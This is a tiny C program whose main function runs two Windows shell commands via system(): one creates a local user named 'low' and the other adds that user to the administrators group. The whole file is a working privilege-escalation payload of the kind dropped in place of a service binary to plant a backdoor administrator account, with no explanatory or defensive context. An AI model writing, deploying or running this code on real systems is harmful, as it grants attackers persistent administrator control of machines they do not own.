#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
int i;
i=system ("net user low /add");
int j;
j=system ("net localgroup administrators low /add");
return 0;
}
